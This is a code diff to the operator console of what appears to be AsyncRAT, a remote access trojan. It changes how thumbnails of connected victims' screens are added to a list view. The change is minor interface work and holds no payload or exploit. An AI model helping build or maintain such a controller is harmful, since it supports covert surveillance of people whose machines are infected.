@@ -1,5 +1,6 @@
 ﻿using AsyncRAT_Sharp.MessagePack;
 using AsyncRAT_Sharp.Sockets;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
@@ -25,19 +26,15 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                                 client.LV2.ImageKey = client.ID;
-                                Program.form1.listView3.BeginUpdate();
-                                Program.form1.listView3.Items.Insert(0, client.LV2);
-                                Program.form1.listView3.EndUpdate();
+                                Program.form1.listView3.Items.Add(client.LV2);
                             }
                         }
                         else
                         {
                             using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                             {
-                                Program.form1.listView3.BeginUpdate();
                                 Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                                 Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
-                                Program.form1.listView3.EndUpdate();
                             }
                         }
                     }));
